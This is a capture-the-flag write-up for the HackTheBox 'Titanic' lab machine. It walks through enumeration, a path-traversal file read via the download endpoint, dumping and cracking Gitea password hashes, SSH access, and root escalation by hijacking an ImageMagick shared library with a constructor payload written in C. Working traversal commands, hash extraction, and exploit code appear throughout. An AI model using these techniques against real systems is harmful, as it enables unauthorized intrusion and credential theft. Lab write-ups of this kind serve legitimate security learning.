

# Enumeration 
nmap output : 
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 18:53 EST
Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 18:53 (0:00:00 remaining)
Nmap scan report for 10.10.11.55
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/26%OT=22%CT=1%CU=37010%PV=Y%DS=2%DC=T%G=Y%TM=67BFA99
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=101%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=FA%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD
OS:=2%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4ECST11NW7%O2=M4ECST11NW7%O3=M4EC
OS:NNT11NW7%O4=M4ECST11NW7%O5=M4ECST11NW7%O6=M4ECST11)WIN(W1=FE88%W2=FE88%W
OS:3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M4ECNNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   47.01 ms 10.10.14.1
2   50.23 ms 10.10.11.55

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                                                                               
Nmap done: 1 IP address (1 host up) scanned in 39.57 seconds
```

adding it  to the hosts folder 
```
echo "10.10.11.55 titanic.htb" > /etc/hosts
```
 
 fuzzing 
```
dirsearch -u http://titanic.htb/ -w ~/repo/SecLists/Discovery/Web-Content/common.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4739

Output File: /home/kali/repo/obsidian-vault/CTF/HTB/machines/titanic/reports/http_titanic.htb/__25-02-26_19-25-07.txt

Target: http://titanic.htb/

[19:25:07] Starting: 
[19:25:12] 405 -  153B  - /book                                             
[19:25:14] 400 -   41B  - /download                                         
[19:25:31] 403 -  276B  - /server-status                                    
Task Completed
```

```
gobuster dns -d titanic.htb  -w ~/repo/SecLists/Discovery/DNS/subdomains-top1million-110000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     titanic.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /home/kali/repo/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 4643 / 114442 (4.06%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 4644 / 114442 (4.06%)
===============================================================
Finished
===============================================================
```

# Exploitation 

following to the page  `titanic.htb`  .. clicking the button `book now` will prompt this 

<img src="./assets/Pasted image 20250226185929.png">

further investigation with burp 

<img src="assets/Pasted image 20250226191212.png">

i wonder if theres other endpoints 
<img src="assets/Pasted image 20250226191331.png">

download link !! lets abuse it 
first it download a json file with our ticket 

<img src="assets/Pasted image 20250226191555.png">

<img src="assets/Pasted image 20250226191818.png">

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

whoa !! that was easy 
so we have the user developer , 
no other dirs or subdomains 
ig thats our first flag 
<img src="assets/Pasted image 20250226192855.png">

# PrivilageEscallation 
i found a subdomain under `/etc/hosts`
```
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

adding it to our hosts file 
```
echo "10.10.11.55       dev.titanic.htb"  > /etc/hosts 
```

<img src="assets/Pasted image 20250227134752.png">

current version of Gitea is 1.22.1
keeping that in mind , we see our user developer made 2 repos and theres the administrator user 
`flask-app` and `dockerconfig`

theres an sql server running on port `3306`  and theres some creds 
<img src="assets/Pasted image 20250227135124.png">
nmap didnt detect that port first but now it does .. mistake from me forgot to put the `-p` flag 
but its closed mean its running locally 
so its mean we are dealing with some sql database and we can find some sqli vurnability in the gitea app since the gitea container and mysql are on the same repo 

after along time dealing with it , it appears that theres no sql vurnabilty , its just that the `.db` file exists in the home directory of the user , under the gitea folder 

we download that file now from the LFI that we found initially 

```bash 
┌──(kali㉿kali)-[~/…/CTF/HTB/machines/titanic]
└─$ curl http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db -o gitea.db
```

and open it with `sqlite3`  
```bash
┌──(kali㉿kali)-[~/…/CTF/HTB/machines/titanic]
└─$ sqlite3 gitea.db
```

we found the table user that contains a lot of information including the hash and salt for the user `developer` 

```bash
┌──(kali㉿kali)-[~/…/CTF/HTB/machines/titanic]
└─$ sqlite3 gitea.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> SELECT lower_name, passwd, salt FROM user; 
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34
test|aca0de80ec45c6a31fd95fc7a59c686306ed1c8a0d197e81c99e08ee3eb3850e2b3645ae7b74651971642b1f2a24b9fa6a19|b6857480e832d3fcd00b254ac3daf841
testuser|320ec72b3888b4b8abe3ad0ceac5dc204cfb40dedcd69c5680a1f8c8611ef6dd4decb90ffb1fc1872b3c23d5e2e600c0b460|8e9c6b896fdf7c0bbae75faa56228889
test1234|add21ff0baf5b04d842df1e5dc102e10ca3605abd3846afcea41f3575f4e6a19044a7b8830cbda3f7eb4a1288c2553032f9c|56eedf4c3d5d21a7708419aeed77e49e
test2|ee59207c24c0d1b95bb9eaef1e411b70dee980c3709d0fc4a7268b218182d93c9d77db08fb6d817f474510557af89f916108|4598ab40a20c67f173e399c641d8058d
```

well we cant crack it like that , we must make it into a hash first , using the [gitea2hash.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py) 
```bash
┌──(kali㉿kali)-[~/repo]
└─$ python3 gitea.py 8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56  
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

now we can crack the shit out of it with hashcat 
```bash 
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

done now we ssh to the machine 
# PrivEscalation 
lets see wat we can do now .
```bash 
-bash-5.1$ sudo -l 
[sudo] password for developer: 
Sorry, user developer may not run sudo on titanic.
```

this user cant run `sudo` under one command but theres a directory under /opt  called  `/scripts`
that contains a `identify_images.sh` script , 

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

it uses the `identify` command of the magick package , might find an exploit for that ? 

after searching more , we found somthing under [CVE-2022-44268](https://git.rotfl.io/v/CVE-2022-44268)

explaining the exploit first , script is running under the root user so automatically any given command will be executed under root , 
`magick` packages is running in version 7.1.1-35 which theres a known exploit that can run command if we changed the a specific shared library that process it , if i m not mistaking , the magick command will look this file up everywhere until it find it and compile wat inside the constructor 

rebuild the exploit by making any `.c` file and compile it with this command 
with this c code 
```c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cat /root/root.txt");
    exit(0);
}
```

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 file_name.c 
```

running the `magick` command will result execute the command 
and we have the root flag 
root.txt:346142bd8030e27980045bc2f7acd97b

[[machines]]